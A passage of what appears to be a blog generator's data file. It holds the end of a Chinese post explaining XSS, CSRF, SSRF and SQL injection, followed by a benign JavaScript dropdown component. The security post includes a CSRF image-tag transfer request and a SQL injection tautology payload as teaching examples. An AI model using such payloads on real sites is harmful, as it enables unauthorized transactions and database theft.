alt=\"\"></p>\n<p>PS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。</p>\n<p>结论：</p>\n<p>这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。</p>\n<p>开发安全措施：</p>\n<ol>\n<li>使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li>\n</ol>\n<p>总结</p>\n<p>XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p>\n<h2 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><p>CSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。</p>\n<h3 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>\n<p>危险网站B，它里面有一段HTML的代码如下：</p>\n<pre><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;\n</code></pre><p>用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块……</p>\n<p>原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以<code>GET</code>的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code>，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<h2 id=\"其他安全问题：\"><a href=\"#其他安全问题：\" class=\"headerlink\" title=\"其他安全问题：\"></a>其他安全问题：</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>\n<p>比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：</p>\n<p><code>book.com/book?id=100</code></p>\n<p>说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</p>\n<p><code>select * from booktable where id=&#39;100&#39;</code></p>\n<p>那么如果我们把url更改为</p>\n<p><code>book.com/book?id=100&#39;or&#39;1&#39;=&#39;1</code></p>\n<p>那么数据库操作执行就变成了：</p>\n<p><code>select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;</code></p>\n<p>从而取出了整个booktable 表单的全部数据。</p>\n<hr>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/lovesong/p/5199623.html\">前端安全之XSS攻击</a></li>\n<li><a href=\"http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\">浅谈CSRF攻击方式</a></li>\n</ul>"},{"title":"第一次面向对象，把对象Po出来吧","_content":"\n> 面对select这种如此常见的需求，怎么能不写个通用组件呢\n\n<!-- more -->\n\n直接po源码，第一次面向对象，如有任何建议、意见，不胜感激！\n\n\tfunction Select(options) {\n\t    this.DOMobj = document.querySelector(options.srcNode);\n\t    this.DOMselect = document.createElement('div');\n\t    this.DOMoptContainer = document.createElement('ul');\n\t    this.DOMoptions = {};\n\n\t    this.prototype = {\n\t        //默认样式\n\t        defaultStyle : {\n\t            'select': {\n\t                'position': 'relative',\n\t                'display': 'inline-block',\n\t                'width': '200px',\n\t                'height': '32px',\n\t                'line-height': '32px',\n\t                'background-color': '#fff',\n\t                'text-align': 'center',\n\t                'box-shadow': '0 0 1px #333',\n\t                'cursor': 'pointer'\n\t            },\n\t            'optContainer': {\n\t                'margin': '0',\n\t                'padding': '0',\n\t                'display': 'none',\n\t                'list-style': 'none',\n\t                'position': 'absolute',\n\t                'z-index': '9999',\n\t                'width': '200px',\n\t                'background-color': '#eee',\n\t                'text-align': 'center',\n\t                'box-shadow': '0 0 1px #333'\n\t            },\n\t            'option': {\n\t                'margin': '0',\n\t                'padding': '0',\n\t                'display': 'inline-block',\n\t                'list-style': 'none',\n\t                'width': '200px',\n\t                'height': '32px',\n\t                'line-height': '32px',\n\t                'background-color': '#eee',\n\t                'color': '#369',\n\t                'text-align': 'center',\n\t                'cursor': 'pointer'\n\t            },\n\t            'option:hover': {\n\t                'background-color': '#2477fb',\n\t                'color': '#fff'\n\t            }\n\t        },\n\t        //给下拉框添加上各选项，同时也作为选择内容框的点击事件\n\t        setOptions: (function() {\n\t            var flag = this.DOMselect.getAttribute('data-isOptionShown') === 'true' ? true : false;\n\t            if(!this.DOMselect.getAttribute('data-isOptionShown')) {\n\t                this.DOMoptContainer.innerHTML = '';\n\t                var elemLi = [];\n\n\t                for (var p in options.data) {\n\t                    if (options.data.hasOwnProperty(p)) {\n\t                        elemLi[p] = document.createElement('li');\n\t                        elemLi[p].setAttribute('data-value', p);\n\t                        elemLi[p].setAttribute('data-content', options.data[p]);\n\t                        elemLi[p].innerHTML = options.data[p];\n\t                        this.DOMoptContainer.appendChild(elemLi[p]);\n\t                        elemLi[p].addEventListener('click', this.prototype.handleSelect);\n\t                    }\n\t                }\n\n\t                this.DOMoptions = this.DOMoptContainer.getElementsByTagName('li');\n\t                this.DOMselect.setAttribute('data-isOptionShown', false);\n\t                this.DOMoptContainer.style.display = 'block';\n\t            } else if(!flag) {\n\t                this.DOMoptContainer.style.display = 'block';\n\t                this.DOMselect.setAttribute('data-isOptionShown', true);\n\t            } else if(flag) {\n\t                this.DOMoptContainer.style.display = 'none';\n\t                this.DOMselect.setAttribute('data-isOptionShown', false);\n\t            }\n\t        }).bind(this),\n\t        //每个选项的点击事件\n\t        handleSelect: (function(e) {\n\t            var ev = e || window.event;\n\t            var target = ev.target || ev.srcElement;\n\n\t            this.DOMselect.innerHTML = target.innerHTML;\n\t            this.DOMselect.setAttribute('data-value', target.getAttribute('data-value'));\n\t            this.DOMselect.setAttribute('data-content', target.getAttribute('data-content'));\n\t            this.DOMselect.setAttribute('data-isOptionShown', false);\n\n\t            this.DOMoptContainer.style.display = 'none';\n\t            if (options.onChange) {\n\t                options.onChange(this.DOMselect);\n\t            }\n\t        }).bind(this),\n\t        //更新样式入口\n\t        updateStyle: (function(str) {\n\t            var o = {};\n\t            if (str) {\n\t                for (var index in str) {\n\t                    o[index] = Object.assign({}, this.prototype.defaultStyle[index], str[index]);\n\t                }\n\t            }\n\t            o = Object.assign({}, this.prototype.defaultStyle, o);\n\t            this.prototype.setStyle(o);\n\t        }).bind(this),\n\t        //为组件内各个元素添加行内样式\n\t        setStyle: (function(s) {\n\t            for(var sKey in s) {\n\t                if(s.hasOwnProperty(sKey)) {\n\t                    var str = '';\n\t                    switch (sKey) {\n\t                    case 'root': {\n\t                        Object.assign(this.DOMobj.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'select': {\n\t                        Object.assign(this.DOMselect.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'optContainer': {\n\t                        Object.assign(this.DOMoptContainer.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'option': {\n\t                        for (var i = 0; i < this.DOMoptions.length; i++) {\n\t                            Object.assign(this.DOMoptions[i].style, s[sKey]);\n\t                        }\n\t                        break;\n\t                    }\n\t                    case 'option:hover': {\n\t                        var self = this;\n\t                        for (var j = 0; j < this.DOMoptions.length; j++) {\n\t                            this.DOMoptions[j].onmouseover = function(event) {\n\t                                var obj = Object.assign({}, self.prototype.defaultStyle.option, self.prototype.defaultStyle['option:hover'], options.style ? Object.assign({}, options.style['option'], options.style['option:hover']) : null);\n\t                                Object.assign(event.target.style, obj);\n\t                            };\n\t                            this.DOMoptions[j].onmouseout = function(event) {\n\t                                var obj = Object.assign({}, self.prototype.defaultStyle.option, options.style ? options.style.option : null);\n\t                                Object.assign(event.target.style, obj);\n\t                            };\n\t                        }\n\t                        break;\n\t                    }\n\t                    }\n\t                }\n\t            }\n\t        }).bind(this),\n\t        //鼠标离开选项区选项消失，mouseleave事件\n\t        loseFocus: (function(event) {\n\t            var ev = event || window.event;\n\t            var target = ev.target || ev.srcElement;\n\t            ev.stopPropagation();\n\t            target.style.display = 'none';\n\n\t            this.DOMselect.setAttribute('data-isOptionShown', false);\n\t        }).bind(this)\n\t    };\n\n\t    //整个组件初始化\n\t    this.init = function() {\n\t        //清空并添加空元素div和ul\n\t        this.DOMobj.innerHTML = '';\n\t        this.DOMobj.appendChild(this.DOMselect);\n\t        this.DOMobj.appendChild(this.DOMoptContainer);\n\n\t        //div作为选择内容框，添加点击事件\n\t        var self = this;\n\t        this.DOMselect.addEventListener('click', function(){self.prototype.setOptions(options.data);}, true);\n\t        this.DOMoptContainer.addEventListener('mouseleave', self.prototype.loseFocus);\n\t        //设置默认选中项\n\t        this.DOMselect.setAttribute('data-value', options.chosen[0]);\n\t        this.DOMselect.setAttribute('data-content', options.chosen[1]);\n\t        this.DOMselect.innerHTML = options.chosen[1];\n\n\t        this.prototype.setOptions(options.data);\n\t        this.prototype.updateStyle(options.style);\n\t    };\n\n\t    this.init();\n\t}","source":"_posts/模拟select.md","raw":"---\n\ntitle: 第一次面向对象，把对象Po出来吧\ntags: ['js', '模块化', '面向对象']\n\n---\n\n> 面对select这种如此常见的需求，怎么能不写个通用组件呢\n\n<!-- more -->\n\n直接po源码，第一次面向对象，如有任何建议、意见，不胜感激！\n\n\tfunction Select(options) {\n\t    this.DOMobj = document.querySelector(options.srcNode);\n\t    this.DOMselect = document.createElement('div');\n\t    this.DOMoptContainer = document.createElement('ul');\n\t    this.DOMoptions = {};\n\n\t    this.prototype = {\n\t        //默认样式\n\t        defaultStyle : {\n\t            'select': {\n\t                'position': 'relative',\n\t                'display': 'inline-block',\n\t                'width': '200px',\n\t                'height': '32px',\n\t                'line-height': '32px',\n\t                'background-color': '#fff',\n\t                'text-align': 'center',\n\t                'box-shadow': '0 0 1px #333',\n\t                'cursor': 'pointer'\n\t            },\n\t            'optContainer': {\n\t                'margin': '0',\n\t                'padding': '0',\n\t                'display': 'none',\n\t                'list-style': 'none',\n\t                'position': 'absolute',\n\t                'z-index': '9999',\n\t                'width': '200px',\n\t                'background-color': '#eee',\n\t                'text-align': 'center',\n\t                'box-shadow': '0 0 1px #333'\n\t            },\n\t            'option': {\n\t                'margin': '0',\n\t                'padding': '0',\n\t                'display': 'inline-block',\n\t                'list-style': 'none',\n\t                'width': '200px',\n\t                'height': '32px',\n\t                'line-height': '32px',\n\t                'background-color': '#eee',\n\t                'color': '#369',\n\t                'text-align': 'center',\n\t                'cursor': 'pointer'\n\t            },\n\t            'option:hover': {\n\t                'background-color': '#2477fb',\n\t                'color': '#fff'\n\t            }\n\t        },\n\t        //给下拉框添加上各选项，同时也作为选择内容框的点击事件\n\t        setOptions: (function() {\n\t            var flag = this.DOMselect.getAttribute('data-isOptionShown') === 'true' ? true : false;\n\t            if(!this.DOMselect.getAttribute('data-isOptionShown')) {\n\t                this.DOMoptContainer.innerHTML = '';\n\t                var elemLi = [];\n\n\t                for (var p in options.data) {\n\t                    if (options.data.hasOwnProperty(p)) {\n\t                        elemLi[p] = document.createElement('li');\n\t                        elemLi[p].setAttribute('data-value', p);\n\t                        elemLi[p].setAttribute('data-content', options.data[p]);\n\t                        elemLi[p].innerHTML = options.data[p];\n\t                        this.DOMoptContainer.appendChild(elemLi[p]);\n\t                        elemLi[p].addEventListener('click', this.prototype.handleSelect);\n\t                    }\n\t                }\n\n\t                this.DOMoptions = this.DOMoptContainer.getElementsByTagName('li');\n\t                this.DOMselect.setAttribute('data-isOptionShown', false);\n\t                this.DOMoptContainer.style.display = 'block';\n\t            } else if(!flag) {\n\t                this.DOMoptContainer.style.display = 'block';\n\t                this.DOMselect.setAttribute('data-isOptionShown', true);\n\t            } else if(flag) {\n\t                this.DOMoptContainer.style.display = 'none';\n\t                this.DOMselect.setAttribute('data-isOptionShown', false);\n\t            }\n\t        }).bind(this),\n\t        //每个选项的点击事件\n\t        handleSelect: (function(e) {\n\t            var ev = e || window.event;\n\t            var target = ev.target || ev.srcElement;\n\n\t            this.DOMselect.innerHTML = target.innerHTML;\n\t            this.DOMselect.setAttribute('data-value', target.getAttribute('data-value'));\n\t            this.DOMselect.setAttribute('data-content', target.getAttribute('data-content'));\n\t            this.DOMselect.setAttribute('data-isOptionShown', false);\n\n\t            this.DOMoptContainer.style.display = 'none';\n\t            if (options.onChange) {\n\t                options.onChange(this.DOMselect);\n\t            }\n\t        }).bind(this),\n\t        //更新样式入口\n\t        updateStyle: (function(str) {\n\t            var o = {};\n\t            if (str) {\n\t                for (var index in str) {\n\t                    o[index] = Object.assign({}, this.prototype.defaultStyle[index], str[index]);\n\t                }\n\t            }\n\t            o = Object.assign({}, this.prototype.defaultStyle, o);\n\t            this.prototype.setStyle(o);\n\t        }).bind(this),\n\t        //为组件内各个元素添加行内样式\n\t        setStyle: (function(s) {\n\t            for(var sKey in s) {\n\t                if(s.hasOwnProperty(sKey)) {\n\t                    var str = '';\n\t                    switch (sKey) {\n\t                    case 'root': {\n\t                        Object.assign(this.DOMobj.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'select': {\n\t                        Object.assign(this.DOMselect.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'optContainer': {\n\t                        Object.assign(this.DOMoptContainer.style, s[sKey]);\n\t                        break;\n\t                    }\n\t                    case 'option': {\n\t                        for (var i = 0; i < this.DOMoptions.length; i++) {\n\t                            Object.assign(this.DOMoptions[i].style, s[sKey]);\n\t                        }\n\t                        break;\n\t                    }\n\t                    case 'option:hover': {\n\t                        var self = this;\n\t                        for (var j = 0; j < this.DOMoptions.length; j++) {\n\t                            this.DOMoptions[j].onmouseover = function(event) {\n\t                                var obj = Object.assign({}, self.prototype.defaultStyle.option, self.prototype.defaultStyle['option:hover'], options.style ? Object.assign({}, options.style['option'], options.style['option:hover']) : null);\n\t                                Object.assign(event.target.style, obj);\n\t                            };\n\t                            this.DOMoptions[j].onmouseout = function(event) {\n\t                                var obj = Object.assign({}, self.prototype.defaultStyle.option, options.style ? options.style.option : null);\n\t                                Object.assign(event.target.style, obj);\n\t                            };\n\t                        }\n\t                        break;\n\t                    }\n\t                    }\n\t                }\n\t            }\n\t        }).bind(this),\n\t        //鼠标离开选项区选项消失，mouseleave事件\n\t        loseFocus: (function(event) {\n\t            var ev = event || window.event;\n\t            var target = ev.target || ev.srcElement;\n\t            ev.stopPropagation();\n\t            target.style.display = 'none';\n\n\t            this.DOMselect.setAttribute('data-isOptionShown', false);\n\t        }).bind(this)\n\t    };\n\n\t    //整个组件初始化\n\t    this.init = function() {\n\t        //清空并添加空元素div和ul\n\t        this.DOMobj.innerHTML = '';\n\t        this.DOMobj.appendChild(this.DOMselect);\n\t        this.DOMobj.appendChild(this.DOMoptContainer);\n\n\t        //div作为选择内容框，添加点击事件\n\t        var self = this;\n\t        this.DOMselect.addEventListener('click', function(){self.prototype.setOptions(options.data);}, true);\n\t        this.DOMoptContainer.addEventListener('mouseleave', self.prototype.loseFocus);\n\t        //设置默认选中项\n\t        this.DOMselect.setAttribute('data-value', options.chosen[0]);\n\t        this.DOMselect.setAttribute('data-content', options.chosen[1]);\n\t        this.DOMselect.innerHTML = options.chosen[1];\n\n\t        this.prototype.setOptions(options.data);\n\t        this.prototype.updateStyle(options.style);\n\t    };\n\n\t    this.init();\n\t}","slug":"模拟select","published":1,"date":"2017-04-22T08:33:38.801Z","updated":"2017-04-22T08:33:10.199Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4g000fl8slxdr47irg","content":"<blockquote>\n<p>面对select这种如此常见的需求，怎么能不写个通用组件呢</p>\n</blockquote>\n<a id=\"more\"></a>\n<p>直接po源码，第一次面向对象，如有任何建议、意见，不胜感激！</p>\n<pre><code>function Select(options) {\n    this.DOMobj = document.querySelector(options.srcNode);\n    this.DOMselect = document.createElement(&apos;div&apos;);\n    this.DOMoptContainer = document.createElement(&apos;ul&apos;);\n    this.DOMoptions = {};\n\n    this.prototype = {\n        //默认样式\n        defaultStyle : {\n            &apos;select&apos;: {\n                &apos;position&apos;: &apos;relative&apos;,\n                &apos;display&apos;: &apos;inline-block&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;height&apos;: &apos;32px&apos;,\n                &apos;line-height&apos;: &apos;32px&apos;,\n                &apos;background-color&apos;: &apos;#fff&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;,\n                &apos;cursor&apos;: &apos;pointer&apos;\n            },\n            &apos;optContainer&apos;: {\n                &apos;margin&apos;: &apos;0&apos;,\n                &apos;padding&apos;: &apos;0&apos;,\n                &apos;display&apos;: &apos;none&apos;,\n                &apos;list-style&apos;: &apos;none&apos;,\n                &apos;position&apos;: &apos;absolute&apos;,\n                &apos;z-index&apos;: &apos;9999&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;background-color&apos;: &apos;#eee&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;\n            },\n            &apos;option&apos;: {\n                &apos;margin&apos;: &apos;0&apos;,\n                &apos;padding&apos;: &apos;0&apos;,\n                &apos;display&apos;: &apos;inline-block&apos;,\n                &apos;list-style&apos;: &apos;none&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;height&apos;: &apos;32px&apos;,\n                &apos;line-height&apos;: &apos;32px&apos;,\n                &apos;background-color&apos;: &apos;#eee&apos;,\n                &apos;color&apos;: &apos;#369&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;cursor&apos;: &apos;pointer&apos;\n            },\n            &apos;option:hover&apos;: {\n                &apos;background-color&apos;: &apos;#2477fb&apos;,\n                &apos;color&apos;: &apos;#fff&apos;\n            }\n        },\n        //给下拉框添加上各选项，同时也作为选择内容框的点击事件\n        setOptions: (function() {\n            var flag = this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;) === &apos;true&apos; ? true : false;\n            if(!this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;)) {\n                this.DOMoptContainer.innerHTML = &apos;&apos;;\n                var elemLi = [];\n\n                for (var p in options.data) {\n                    if (options.data.hasOwnProperty(p)) {\n                        elemLi[p] = document.createElement(&apos;li&apos;);\n                        elemLi[p].setAttribute(&apos;data-value&apos;, p);\n                        elemLi[p].setAttribute(&apos;data-content&apos;, options.data[p]);\n                        elemLi[p].innerHTML = options.data[p];\n                        this.DOMoptContainer.appendChild(elemLi[p]);\n                        elemLi[p].addEventListener(&apos;click&apos;, this.prototype.handleSelect);\n                    }\n                }\n\n                this.DOMoptions = this.DOMoptContainer.getElementsByTagName(&apos;li&apos;);\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n                this.DOMoptContainer.style.display = &apos;block&apos;;\n            } else if(!flag) {\n                this.DOMoptContainer.style.display = &apos;block&apos;;\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, true);\n            } else if(flag) {\n                this.DOMoptContainer.style.display = &apos;none&apos;;\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n            }\n        }).bind(this),\n        //每个选项的点击事件\n        handleSelect: (function(e) {\n            var ev = e || window.event;\n            var target = ev.target || ev.srcElement;\n\n            this.DOMselect.innerHTML = target.innerHTML;\n            this.DOMselect.setAttribute(&apos;data-value&apos;, target.getAttribute(&apos;data-value&apos;));\n            this.DOMselect.setAttribute(&apos;data-content&apos;, target.getAttribute(&apos;data-content&apos;));\n            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n\n            this.DOMoptContainer.style.display = &apos;none&apos;;\n            if (options.onChange) {\n                options.onChange(this.DOMselect);\n            }\n        }).bind(this),\n        //更新样式入口\n        updateStyle: (function(str) {\n            var o = {};\n            if (str) {\n                for (var index in str) {\n                    o[index] = Object.assign({}, this.prototype.defaultStyle[index], str[index]);\n                }\n            }\n            o = Object.assign({}, this.prototype.defaultStyle, o);\n            this.prototype.setStyle(o);\n        }).bind(this),\n        //为组件内各个元素添加行内样式\n        setStyle: (function(s) {\n            for(var sKey in s) {\n                if(s.hasOwnProperty(sKey)) {\n                    var str = &apos;&apos;;\n                    switch (sKey) {\n                    case &apos;root&apos;: {\n                        Object.assign(this.DOMobj.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;select&apos;: {\n                        Object.assign(this.DOMselect.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;optContainer&apos;: {\n                        Object.assign(this.DOMoptContainer.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;option&apos;: {\n                        for (var i = 0; i &lt; this.DOMoptions.length; i++) {\n                            Object.assign(this.DOMoptions[i].style, s[sKey]);\n                        }\n                        break;\n                    }\n                    case &apos;option:hover&apos;: {\n                        var self = this;\n                        for (var j = 0; j &lt; this.DOMoptions.length; j++) {\n                            this.DOMoptions[j].onmouseover = function(event) {\n                                var obj = Object.assign({}, self.prototype.defaultStyle.option, self.prototype.defaultStyle[&apos;option:hover&apos;], options.style ? Object.assign({}, options.style[&apos;option&apos;], options.style[&apos;option:hover&apos;]) : null);\n                                Object.assign(event.target.style, obj);\n                            };\n                            this.DOMoptions[j].onmouseout = function(event) {\n                                var obj = Object.assign({}, self.prototype.defaultStyle.option, options.style ? options.style.option : null);\n                                Object.assign(event.target.style, obj);\n                            };\n                        }\n                        break;\n                    }\n                    }\n                }\n            }\n        }).bind(this),\n        //鼠标离开选项区选项消失，mouseleave事件\n        loseFocus: (function(event) {\n            var ev = event || window.event;\n            var target = ev.target || ev.srcElement;\n            ev.stopPropagation();\n            target.style.display = &apos;none&apos;;\n\n            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n        }).bind(this)\n    };\n\n    //整个组件初始化\n    this.init = function() {\n        //清空并添加空元素div和ul\n        this.DOMobj.innerHTML = &apos;&apos;;\n        this.DOMobj.appendChild(this.DOMselect);\n        this.DOMobj.appendChild(this.DOMoptContainer);\n\n        //div作为选择内容框，添加点击事件\n        var self = this;\n        this.DOMselect.addEventListener(&apos;click&apos;, function(){self.prototype.setOptions(options.data);}, true);\n        this.DOMoptContainer.addEventListener(&apos;mouseleave&apos;, self.prototype.loseFocus);\n        //设置默认选中项\n        this.DOMselect.setAttribute(&apos;data-value&apos;, options.chosen[0]);\n        this.DOMselect.setAttribute(&apos;data-content&apos;, options.chosen[1]);\n        this.DOMselect.innerHTML = options.chosen[1];\n\n        this.prototype.setOptions(options.data);\n        this.prototype.updateStyle(options.style);\n    };\n\n    this.init();\n}\n</code></pre>","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>面对select这种如此常见的需求，怎么能不写个通用组件呢</p>\n</blockquote>","more":"<p>直接po源码，第一次面向对象，如有任何建议、意见，不胜感激！</p>\n<pre><code>function Select(options) {\n    this.DOMobj = document.querySelector(options.srcNode);\n    this.DOMselect = document.createElement(&apos;div&apos;);\n    this.DOMoptContainer = document.createElement(&apos;ul&apos;);\n    this.DOMoptions = {};\n\n    this.prototype = {\n        //默认样式\n        defaultStyle : {\n            &apos;select&apos;: {\n                &apos;position&apos;: &apos;relative&apos;,\n                &apos;display&apos;: &apos;inline-block&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;height&apos;: &apos;32px&apos;,\n                &apos;line-height&apos;: &apos;32px&apos;,\n                &apos;background-color&apos;: &apos;#fff&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;,\n                &apos;cursor&apos;: &apos;pointer&apos;\n            },\n            &apos;optContainer&apos;: {\n                &apos;margin&apos;: &apos;0&apos;,\n                &apos;padding&apos;: &apos;0&apos;,\n                &apos;display&apos;: &apos;none&apos;,\n                &apos;list-style&apos;: &apos;none&apos;,\n                &apos;position&apos;: &apos;absolute&apos;,\n                &apos;z-index&apos;: &apos;9999&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;background-color&apos;: &apos;#eee&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;\n            },\n            &apos;option&apos;: {\n                &apos;margin&apos;: &apos;0&apos;,\n                &apos;padding&apos;: &apos;0&apos;,\n                &apos;display&apos;: &apos;inline-block&apos;,\n                &apos;list-style&apos;: &apos;none&apos;,\n                &apos;width&apos;: &apos;200px&apos;,\n                &apos;height&apos;: &apos;32px&apos;,\n                &apos;line-height&apos;: &apos;32px&apos;,\n                &apos;background-color&apos;: &apos;#eee&apos;,\n                &apos;color&apos;: &apos;#369&apos;,\n                &apos;text-align&apos;: &apos;center&apos;,\n                &apos;cursor&apos;: &apos;pointer&apos;\n            },\n            &apos;option:hover&apos;: {\n                &apos;background-color&apos;: &apos;#2477fb&apos;,\n                &apos;color&apos;: &apos;#fff&apos;\n            }\n        },\n        //给下拉框添加上各选项，同时也作为选择内容框的点击事件\n        setOptions: (function() {\n            var flag = this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;) === &apos;true&apos; ? true : false;\n            if(!this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;)) {\n                this.DOMoptContainer.innerHTML = &apos;&apos;;\n                var elemLi = [];\n\n                for (var p in options.data) {\n                    if (options.data.hasOwnProperty(p)) {\n                        elemLi[p] = document.createElement(&apos;li&apos;);\n                        elemLi[p].setAttribute(&apos;data-value&apos;, p);\n                        elemLi[p].setAttribute(&apos;data-content&apos;, options.data[p]);\n                        elemLi[p].innerHTML = options.data[p];\n                        this.DOMoptContainer.appendChild(elemLi[p]);\n                        elemLi[p].addEventListener(&apos;click&apos;, this.prototype.handleSelect);\n                    }\n                }\n\n                this.DOMoptions = this.DOMoptContainer.getElementsByTagName(&apos;li&apos;);\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n                this.DOMoptContainer.style.display = &apos;block&apos;;\n            } else if(!flag) {\n                this.DOMoptContainer.style.display = &apos;block&apos;;\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, true);\n            } else if(flag) {\n                this.DOMoptContainer.style.display = &apos;none&apos;;\n                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n            }\n        }).bind(this),\n        //每个选项的点击事件\n        handleSelect: (function(e) {\n            var ev = e || window.event;\n            var target = ev.target || ev.srcElement;\n\n            this.DOMselect.innerHTML = target.innerHTML;\n            this.DOMselect.setAttribute(&apos;data-value&apos;, target.getAttribute(&apos;data-value&apos;));\n            this.DOMselect.setAttribute(&apos;data-content&apos;, target.getAttribute(&apos;data-content&apos;));\n            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n\n            this.DOMoptContainer.style.display = &apos;none&apos;;\n            if (options.onChange) {\n                options.onChange(this.DOMselect);\n            }\n        }).bind(this),\n        //更新样式入口\n        updateStyle: (function(str) {\n            var o = {};\n            if (str) {\n                for (var index in str) {\n                    o[index] = Object.assign({}, this.prototype.defaultStyle[index], str[index]);\n                }\n            }\n            o = Object.assign({}, this.prototype.defaultStyle, o);\n            this.prototype.setStyle(o);\n        }).bind(this),\n        //为组件内各个元素添加行内样式\n        setStyle: (function(s) {\n            for(var sKey in s) {\n                if(s.hasOwnProperty(sKey)) {\n                    var str = &apos;&apos;;\n                    switch (sKey) {\n                    case &apos;root&apos;: {\n                        Object.assign(this.DOMobj.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;select&apos;: {\n                        Object.assign(this.DOMselect.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;optContainer&apos;: {\n                        Object.assign(this.DOMoptContainer.style, s[sKey]);\n                        break;\n                    }\n                    case &apos;option&apos;: {\n                        for (var i = 0; i &lt; this.DOMoptions.length; i++) {\n                            Object.assign(this.DOMoptions[i].style, s[sKey]);\n                        }\n                        break;\n                    }\n                    case &apos;option:hover&apos;: {\n                        var self = this;\n                        for (var j = 0; j &lt; this.DOMoptions.length; j++) {\n                            this.DOMoptions[j].onmouseover = function(event) {\n                                var obj = Object.assign({}, self.prototype.defaultStyle.option, self.prototype.defaultStyle[&apos;option:hover&apos;], options.style ? Object.assign({}, options.style[&apos;option&apos;], options.style[&apos;option:hover&apos;]) : null);\n                                Object.assign(event.target.style, obj);\n                            };\n                            this.DOMoptions[j].onmouseout = function(event) {\n                                var obj = Object.assign({}, self.prototype.defaultStyle.option, options.style ? options.style.option : null);\n                                Object.assign(event.target.style, obj);\n                            };\n                        }\n                        break;\n                    }\n                    }\n                }\n            }\n        }).bind(this),\n        //鼠标离开选项区选项消失，mouseleave事件\n        loseFocus: (function(event) {\n            var 